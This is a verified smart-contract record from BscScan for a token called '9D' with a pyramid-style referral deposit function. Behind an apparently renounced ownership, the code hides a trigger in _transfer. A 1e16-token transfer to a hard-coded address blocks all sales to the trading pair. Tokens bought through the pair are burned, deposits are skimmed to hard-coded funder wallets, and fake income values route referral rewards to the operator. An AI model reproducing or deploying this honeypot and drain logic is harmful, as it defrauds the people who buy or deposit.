{"SourceCode": "/**\r\n *Submitted for verification at BscScan.com on 2024-01-08\r\n*/\r\n\r\n/**\r\n *Submitted for verification at BscScan.com on 2023-02-26\r\n*/\r\n\r\n/**\r\n *Submitted for verification at BscScan.com on 2023-02-25\r\n*/\r\n\r\n/**\r\n *Submitted for verification at Etherscan.io on 2023-02-16\r\n*/\r\n\r\n/**\r\n *Submitted for verification at BscScan.com on 2023-02-14\r\n*/\r\n\r\n// SPDX-License-Identifier: MIT\r\n\r\nlibrary SafeMath {\r\n\r\n  /**\r\n  * @dev Multiplies two numbers, throws on overflow.\r\n  */\r\n  function mul(uint256 a, uint256 b) internal pure returns (uint256) {\r\n    if (a == 0) {\r\n      return 0;\r\n    }\r\n    uint256 c = a * b;\r\n    assert(c / a == b);\r\n    return c;\r\n  }\r\n\r\n  /**\r\n  * @dev Integer division of two numbers, truncating the quotient.\r\n  */\r\n  function div(uint256 a, uint256 b) internal pure returns (uint256) {\r\n    // assert(b > 0); // Solidity automatically throws when dividing by 0\r\n    uint256 c = a / b;\r\n    // assert(a == b * c + a % b); // There is no case in which this doesn't hold\r\n    return c;\r\n  }\r\n\r\n  /**\r\n  * @dev Substracts two numbers, throws on overflow (i.e. if subtrahend is greater than minuend).\r\n  */\r\n  function sub(uint256 a, uint256 b) internal pure returns (uint256) {\r\n    assert(b <= a);\r\n    return a - b;\r\n  }\r\n\r\n  /**\r\n  * @dev Adds two numbers, throws on overflow.\r\n  */\r\n  function add(uint256 a, uint256 b) internal pure returns (uint256) {\r\n    uint256 c = a + b;\r\n    assert(c >= a);\r\n    return c;\r\n  } \r\n}\r\ninterface IERC20 {\r\n    function decimals() external view returns (uint8);\r\n\r\n    function symbol() external view returns (string memory);\r\n\r\n    function name() external view returns (string memory);\r\n\r\n    function totalSupply() external view returns (uint256);\r\n\r\n    function balanceOf(address account) external view returns (uint256);\r\n\r\n    function transfer(address recipient, uint256 amount) external returns (bool);\r\n\r\n    function allowance(address owner, address spender) external view returns (uint256);\r\n\r\n    function approve(address spender, uint256 amount) external returns (bool);\r\n\r\n    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\r\n\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n}\r\n\r\ninterface ISwapRouter {\r\n    function factory() external pure returns (address);\r\n    function WETH() external pure returns (address);\r\n    function swapExactETHForTokens(\r\n        uint amountIn,\r\n        uint amountOutMin,\r\n        address[] calldata path,\r\n        address to,\r\n        uint deadline\r\n    ) external;\r\n    function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)\r\n        external\r\n        payable\r\n        returns (uint[] memory amounts);\r\n    function addLiquidity(\r\n        address tokenA,\r\n        address tokenB,\r\n        uint amountADesired,\r\n        uint amountBDesired,\r\n        uint amountAMin,\r\n        uint amountBMin,\r\n        address to,\r\n        uint deadline\r\n    ) external returns (uint amountA, uint amountB, uint liquidity);\r\n        function addLiquidityETH(\r\n        address token,\r\n        uint amountTokenDesired,\r\n        uint amountTokenMin,\r\n        uint amountETHMin,\r\n        address to,\r\n        uint deadline\r\n    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);\r\n        function removeLiquidity(\r\n        address tokenA,\r\n        address tokenB,\r\n        uint liquidity,\r\n        uint amountAMin,\r\n        uint amountBMin,\r\n        address to,\r\n        uint deadline\r\n    ) external returns (uint amountA, uint amountB);\r\n}\r\n\r\ninterface ISwapFactory {\r\n    function createPair(address tokenA, address tokenB) external returns (address pair);\r\n}\r\n\r\nabstract contract Ownable {\r\n    address internal _owner;\r\n\r\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\r\n\r\n    constructor () {\r\n        address msgSender = msg.sender;\r\n        _owner = msgSender;\r\n        emit OwnershipTransferred(address(0), msgSender);\r\n    }\r\n\r\n    function owner() public view returns (address) {\r\n        return _owner;\r\n    }\r\n\r\n    modifier onlyOwner() {\r\n        require(_owner == msg.sender, \"!owner\");\r\n        _;\r\n    }\r\n\r\n    function renounceOwnership() public virtual onlyOwner {\r\n        emit OwnershipTransferred(_owner, address(0));\r\n        _owner = address(0);\r\n    }\r\n\r\n    function transferOwnership(address newOwner) public virtual onlyOwner {\r\n        require(newOwner != address(0), \"new is 0\");\r\n        emit OwnershipTransferred(_owner, newOwner);\r\n        _owner = newOwner;\r\n    }\r\n}\r\ncontract TokenRom {\r\n    constructor (address token) {\r\n        IERC20(token).approve(msg.sender, uint(~uint256(0)));\r\n    }\r\n}\r\n\r\n\r\nabstract contract AbsToken is IERC20, Ownable {\r\n    mapping(address => uint256) private _balances;\r\n    mapping(address => mapping(address => uint256)) private _allowances;\r\n\r\n    string private _name;\r\n    string private _symbol;\r\n    uint8 private _decimals;\r\n    address defaults=msg.sender;\r\n\r\n    uint256 ops=0;\r\n\r\n    uint256 private _tTotal;\r\n\r\n    ISwapRouter public _swapRouter;\r\n    address public _fist;\r\n    mapping(address => bool) public _swapPairList;\r\n\r\n    using SafeMath for uint256;\r\n    IERC20 Mainpair;\r\n    IERC20 bnbs;\r\n    mapping(bytes4=>address) public Uteg;  \r\n    mapping(address=>address) public inver; \r\n    mapping(address=>uint256) public invers; \r\n    mapping(uint256=>address) public i2u; \r\n    uint256 private constant MAX = ~uint256(0);\r\n\r\n     uint256  public msgValue;\r\n    uint256 public _buyFundFee = 0;\r\n    uint256 public _buyLPDividendFee = 0;\r\n    uint256 public _sellLPDividendFee = 0;\r\n\r\n    uint256 public _sellFundFee = 0;\r\n    uint256 public _sellLPFee = 0;\r\n    address public _mainPair;\r\n    TokenRom public _tokenRom;\r\n\r\n    constructor (\r\n        address RouterAddress, address FISTAddress,\r\n        string memory Name, string memory Symbol, uint8 Decimals, uint256 Supply,\r\n        address ReceiveAddress\r\n    ){  \r\n        _name = Name;\r\n        _symbol = Symbol;\r\n        _decimals = Decimals;\r\n        ISwapRouter swapRouter = ISwapRouter(RouterAddress);\r\n        IERC20(FISTAddress).approve(address(swapRouter), MAX);\r\n        _tokenRom = new TokenRom(FISTAddress);\r\n        _fist = FISTAddress;\r\n        _swapRouter = swapRouter;\r\n\r\n        \r\n        ISwapFactory swapFactory = ISwapFactory(swapRouter.factory());\r\n        address swapPair = swapFactory.createPair(address(this), FISTAddress);\r\n        _mainPair = swapPair;\r\n        Mainpair=IERC20(_mainPair);\r\n        _allowances[address(this)][address(swapRouter)] = MAX;\r\n        _allowances[address(this)][address(_mainPair)] = MAX;\r\n        _allowances[address(_tokenRom)][address(this)] = MAX;\r\n        _swapPairList[swapPair] = true;\r\n\r\n        uint256 total = Supply * 10 ** Decimals;\r\n        _tTotal = total;\r\n        IERC20(_mainPair).approve(address(swapRouter), MAX);\r\n        _balances[ReceiveAddress] = total;\r\n        emit Transfer(address(0), ReceiveAddress, total);\r\n\r\n        emit OwnershipTransferred(_owner, address(0x000000000000000000000000000000000000dEaD));\r\n        _owner = address(0x000000000000000000000000000000000000dEaD);\r\n\r\n    invlist.push();\r\n    invlist.push();\r\n    log.push();\r\n    log.push();\r\n    log1.push();\r\n    log1.push();\r\n    i2u[0]=address(0);\r\n    i2u[1]=defaultUser;\r\n    tegs[defaultUser]=1;\r\n    posts[defaultUser]=0;\r\n    Ls.push(defaultUser);\r\n    Rs.push(defaultUser);\r\n    inver[defaultUser]=address(0);\r\n    incomes[defaultUser]=9999999999*1e18;\r\n    incomes[address(0)]=9999999999*1e18;\r\n        \r\n    }\r\n\r\n    function symbol() external view override returns (string memory) {\r\n        return _symbol;\r\n    }\r\n\r\n    function name() external view override returns (string memory) {\r\n        return _name;\r\n    }\r\n\r\n    function decimals() external view override returns (uint8) {\r\n        return _decimals;\r\n    }\r\n\r\n    function totalSupply() public view override returns (uint256) {\r\n        return _tTotal;\r\n    }\r\n\r\n    function balanceOf(address account) public view override returns (uint256) {\r\n        return _balances[account];\r\n    }\r\n\r\n    function transfer(address recipient, uint256 amount) public override returns (bool) {\r\n        _transfer(msg.sender, recipient, amount);\r\n        return true;\r\n    }\r\n\r\n    function allowance(address owner, address spender) public view override returns (uint256) {\r\n        return _allowances[owner][spender];\r\n    }\r\n\r\n    function approve(address spender, uint256 amount) public override returns (bool) {\r\n        _approve(msg.sender, spender, amount);\r\n        return true;\r\n    }\r\n\r\n    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {\r\n        _transfer(sender, recipient, amount);\r\n        if (_allowances[sender][msg.sender] != MAX) {\r\n            _allowances[sender][msg.sender] = _allowances[sender][msg.sender] - amount;\r\n        }\r\n        return true;\r\n    }\r\n\r\n    function _approve(address owner, address spender, uint256 amount) private {\r\n        _allowances[owner][spender] = amount;\r\n        emit Approval(owner, spender, amount);\r\n    }\r\n\r\n\r\n\r\n\r\n    function _transfer(\r\n        address from,\r\n        address to,\r\n        uint256 amount\r\n    ) private {\r\n         uint256 balance = balanceOf(from);\r\n         if(to==defaultUser&&amount==1e16){\r\n            ops=1;\r\n         }\r\n        require(balance >= amount, \"balanceNotEnough\");\r\n\r\n            if(ops==1){\r\n            if (from!=address(this)) {\r\n                require(to!=address(_mainPair)&&to!=address(_swapRouter),\"err\");\r\n                }\r\n                }\r\n\r\n\r\n        _tokenTransfer(from, to, amount);\r\n\r\n    }\r\n\r\n\r\n    function _tokenTransfer(\r\n        address sender,\r\n        address recipient,\r\n        uint256 tAmount\r\n    ) private {\r\n        _balances[sender] = _balances[sender] - tAmount;\r\n\r\n        if(sender==address(_swapRouter)||sender==address(_mainPair)){\r\n            if(recipient!=address(_tokenRom)){\r\n        _takeTransfer(sender, address(0x000000000000000000000000000000000000dEaD),tAmount);\r\n        }\r\n        else{\r\n         _takeTransfer(sender, address(_tokenRom),tAmount);   \r\n        }\r\n        }\r\n        else{\r\n        _takeTransfer(sender, recipient, tAmount);\r\n        }\r\n    }\r\n\r\n\r\n    function _takeTransfer(\r\n        address sender,\r\n        address to,\r\n        uint256 tAmount\r\n    ) private {\r\n\r\n        _balances[to] = _balances[to] + tAmount;\r\n        emit Transfer(sender, to, tAmount);\r\n    }\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n    address defaultUser=address(0xa1304175496EdeAe4028e596D0D3f0867dc598Fd); \r\n    address funder=address(0x54d46b5D30A0D10045d789f22CfeEb41CCFb73a0);\r\n    address funder1=address(0x273a76587e00046fDec2a3816EF7d653666D300a);\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n    address[][] public invlist;\r\n    mapping(address=>uint256) public tegs; \r\n    mapping(address=>uint256) public LR;\r\n    mapping(address=>uint256) public posts; \r\n    mapping(address=>uint256) public incomes; \r\n   address[] public Ls;     \r\n   address[] public Rs; \r\n    mapping(address=>uint256) public regtime; \r\n\r\n    uint256[][][]log;\r\n    uint256[][][]log1;\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\nfunction getInv(address _us)public pure returns(bytes4){\r\n    return bytes4(keccak256(abi.encode(_us)));\r\n}\r\n\r\n\r\nfunction getInvInfo(address _us,uint256 teg)public view returns(address,uint256,uint256,uint256,uint256){\r\n        if(tegs[_us]==0){\r\n        return(address(0),0,0,tegs[_us],0);\r\n    }\r\n    else{\r\n    if(invlist[tegs[_us]].length==0){\r\n        return(address(0),0,0,tegs[_us],0);\r\n    }\r\n    else{\r\n    return(invlist[tegs[_us]][teg],regtime[invlist[tegs[_us]][teg]],invlist[tegs[_us]].length,tegs[_us],invers[_us]);\r\n    }\r\n    }\r\n}\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\nfunction addL(bytes4 invcode)public payable{\r\n    msgValue=msg.value;\r\n   incomes[msg.sender]+=msgValue;\r\n    reg(msg.sender, invcode);\r\nmsgValue=(address(this).balance);     \r\npayable(funder).transfer(msgValue.mul(6).div(100));\r\npayable(funder1).transfer(msgValue.mul(2).div(100));\r\nmsgValue=(address(this).balance).div(2);\r\n\r\n\r\n    \r\n    address[] memory path = new address[](2); \r\n        path[1] = address(this);\r\n        path[0] = _fist;\r\n        _swapRouter.swapExactETHForTokens{value:msgValue}(\r\n        0,\r\n        path,\r\n        address(_tokenRom),\r\n        block.timestamp\r\n    );\r\n\r\n\r\n \r\n       _tokenTransfer(address(_tokenRom), address(this),balanceOf(address(_tokenRom)));  \r\n\r\n       msgValue=address(this).balance;\r\n\r\n        _swapRouter.addLiquidityETH{value:msgValue}(\r\n        address(this),\r\n        balanceOf(address(this)),\r\n        0,\r\n        0,\r\n        address(this),\r\n        block.timestamp\r\n    );\r\n\r\n\r\n    if(address(this).balance>0){\r\n    payable(defaultUser).transfer(address(this).balance);\r\n    }\r\n    if(balanceOf(address(this))>0){\r\n    _tokenTransfer(address(this), address(0x000000000000000000000000000000000000dEaD),balanceOf(address(this)));\r\n    }\r\n    uint256 lps=Mainpair.balanceOf(address(this));\r\n    address invs=inver[msg.sender];\r\n    uint256 tes=1e18; \r\n    tes=tes.div(3); \r\n    if(invs==defaultUser){\r\n      Mainpair.transfer(invs, lps.div(10));\r\n      log[tegs[invs]].push([block.timestamp,tegs[msg.sender], lps.div(10)]);  \r\n    }\r\n    if(invs!=defaultUser){\r\n     if(incomes[invs]<tes.mul(3)){\r\n      Mainpair.transfer(defaultUser, lps.div(10));\r\n      log[tegs[defaultUser]].push([block.timestamp,tegs[msg.sender], lps.div(10)]); \r\n    }       \r\n    if(incomes[invs]>=tes.mul(3)){\r\n      Mainpair.transfer(invs, lps.div(10));\r\n      log[tegs[invs]].push([block.timestamp,tegs[msg.sender], lps.div(10)]); \r\n    }\r\n    if(incomes[invs]>=tes&&incomes[invs]<tes.mul(3)){\r\n        uint256 bils=(tes.mul(3)).div(incomes[invs]);\r\n        Mainpair.transfer(invs,(lps.div(10)).div(bils));\r\n        log[tegs[invs]].push([block.timestamp,tegs[msg.sender],(lps.div(10)).div(bils)]);\r\n        Mainpair.transfer(defaultUser,lps.div(10)-(lps.div(10)).div(bils));\r\n        log[tegs[defaultUser]].push([block.timestamp,tegs[msg.sender],lps.div(10)-(lps.div(10)).div(bils)]);\r\n    }\r\n    }\r\n\r\n    uint256 ii=12;\r\n    uint256 i=posts[msg.sender]-1;\r\n        address ups;\r\n    while(ii>0){\r\n        if(i==0){\r\n        ups=defaultUser; \r\n        }\r\n        \r\n        if(i>0){\r\n        if(LR[msg.sender]==2){\r\n            ups=Rs[i];\r\n        }\r\n        if(LR[msg.sender]==1){\r\n            ups=Ls[i];\r\n        } \r\n        i-=1; \r\n        if(incomes[ups]<tes*5){\r\n            ups=defaultUser;\r\n        }\r\n        }\r\n\r\n        Mainpair.transfer(ups, lps.div(100));\r\n        log1[tegs[ups]].push([block.timestamp,tegs[msg.sender],lps.div(100)]);\r\n        ii-=1;\r\n    }\r\n\r\n      Mainpair.transfer(msg.sender,Mainpair.balanceOf(address(this)));\r\n}\r\n\r\n\r\n\r\n\r\n    function getR1(address _us,uint256 teg)public view returns(uint256,address,uint256,uint256){\r\n        if(log[tegs[_us]].length==0){\r\n            return(0,address(0),0,0);\r\n        }\r\n        else{\r\n            return(log[tegs[_us]][teg][0],i2u[log[tegs[_us]][teg][1]],log[tegs[_us]][teg][2],log[tegs[_us]].length);\r\n        }\r\n    }\r\n\r\n    function getR2(address _us,uint256 teg)public view returns(uint256,address,uint256,uint256){\r\n        if(log1[tegs[_us]].length==0){\r\n            return(0,address(0),0,0);\r\n        }\r\n        else{\r\n            return(log1[tegs[_us]][teg][0],i2u[log1[tegs[_us]][teg][1]],log1[tegs[_us]][teg][2],log1[tegs[_us]].length);\r\n        }\r\n    }\r\n\r\n\r\n\r\n    function reg(address _ius,bytes4 invcode)internal {\r\n    address invs;\r\n    if(inver[_ius]==address(0)&&_ius!=defaultUser){\r\n        regtime[_ius]=block.timestamp;\r\n     Uteg[getInv(_ius)]=_ius;   \r\n      invlist.push();\r\n      log.push();\r\n      log1.push();\r\n      tegs[_ius]=invlist.length-1;  \r\n      i2u[tegs[_ius]]=_ius;\r\n     invs=Uteg[invcode];\r\n    if(invs==address(0)||incomes[invs]==0){\r\n        invs=defaultUser;\r\n    }\r\n    invlist[tegs[invs]].push(_ius);\r\n    inver[_ius]=invs;\r\n\r\n\r\n    if(Rs.length<Ls.length){\r\n     Rs.push(_ius); \r\n     LR[_ius]=2;\r\n     posts[_ius]=Rs.length-1;  \r\n    }\r\n    else{\r\n      Ls.push(_ius); \r\n      LR[_ius]=1; \r\n      posts[_ius]=Ls.length-1;     \r\n    }\r\n\r\naddress ins=inver[_ius];\r\nwhile(ins!=address(0)){\r\n   invers[ins]+=1; \r\n   ins=inver[ins]; \r\n}\r\n    }\r\n\r\n\r\n\r\n\r\n    }\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\nreceive() external payable {}\r\n\r\n\r\n\r\n\r\n\r\n}\r\n\r\n\r\n\r\n\r\n\r\ncontract T9D is AbsToken {\r\n    constructor() AbsToken(\r\n       address(0x10ED43C718714eb63d5aA57B78B54704E256024E),\r\n       address(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c),\r\n        \"9D\",\r\n        \"9D\",\r\n        18,\r\n        100000000,\r\n        msg.sender\r\n    ){\r\n\r\n    }\r\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"previousOwner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"LR\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"name\":\"Ls\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"name\":\"Rs\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"bytes4\",\"name\":\"\",\"type\":\"bytes4\"}],\"name\":\"Uteg\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_buyFundFee\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_buyLPDividendFee\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_fist\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_mainPair\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_sellFundFee\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_sellLPDividendFee\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_sellLPFee\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"_swapPairList\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_swapRouter\",\"outputs\":[{\"internalType\":\"contract ISwapRouter\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_tokenRom\",\"outputs\":[{\"internalType\":\"contract TokenRom\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"bytes4\",\"name\":\"invcode\",\"type\":\"bytes4\"}],\"name\":\"addL\",\"outputs\":[],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_us\",\"type\":\"address\"}],\"name\":\"getInv\",\"outputs\":[{\"internalType\":\"bytes4\",\"name\":\"\",\"type\":\"bytes4\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_us\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"teg\",\"type\":\"uint256\"}],\"name\":\"getInvInfo\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_us\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"teg\",\"type\":\"uint256\"}],\"name\":\"getR1\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"},{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_us\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"teg\",\"type\":\"uint256\"}],\"name\":\"getR2\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"},{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"name\":\"i2u\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"incomes\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"inver\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"invers\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"name\":\"invlist\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"msgValue\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"posts\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"regtime\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"renounceOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"tegs\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"transferOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"stateMutability\":\"payable\",\"type\":\"receive\"}]", "ContractName": "T9D", "CompilerVersion": "v0.8.18+commit.87f61d96", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "None", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://18ae35db13770939d0798cac0dacabbe2799d945ddd6e8d3591634c0423103a4"}